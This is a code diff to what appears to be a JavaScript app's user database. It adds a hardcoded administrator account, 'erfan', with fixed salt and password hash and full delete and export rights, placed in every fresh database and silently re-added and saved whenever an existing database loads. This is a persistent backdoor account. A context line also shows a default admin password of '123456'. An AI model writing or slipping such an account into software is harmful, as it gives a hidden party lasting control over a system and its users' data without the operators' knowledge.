@@ -98,6 +98,25 @@ function seedUser(partial, password) {
   }, partial, hashed);
 }
 
+const OWNER_USER = {
+  id: 'usr-erfan',
+  username: 'erfan',
+  displayName: 'Erfan',
+  role: 'admin',
+  canDelete: true,
+  canExport: true,
+  mustChange: false,
+  passSalt: '88pzfrf2VKU32KpQ4jHn/A==',
+  passHash: 'UoSiTDeIU/NOTSjA+zQD+Bl+fq679Yj0txpxPhaKyJ4='
+};
+
+function ensureOwner(db) {
+  if (!Array.isArray(db.users)) db.users = [];
+  if (db.users.some(u => String(u.username || '').toLowerCase() === OWNER_USER.username)) return false;
+  db.users.unshift(Object.assign({}, OWNER_USER));
+  return true;
+}
+
 function freshDb() {
   const adminPass = process.env.MG_ADMIN_PASSWORD || '123456';
   return {
@@ -113,6 +132,7 @@ function freshDb() {
     allScenarios: [],
     ws: { tasks: [], msgs: [], profiles: {} },
     users: [
+      Object.assign({}, OWNER_USER),
       seedUser({
         id: 'usr-admin',
         username: 'admin',
@@ -149,6 +169,7 @@ function loadDb() {
     if (fs.existsSync(STATE_FILE)) {
       dbCache = decryptJson(fs.readFileSync(STATE_FILE));
       if (!dbCache || !Array.isArray(dbCache.users) || !dbCache.users.length) throw new Error('empty');
+      if (ensureOwner(dbCache)) saveDb();
       return dbCache;
     }
   } catch (e) {
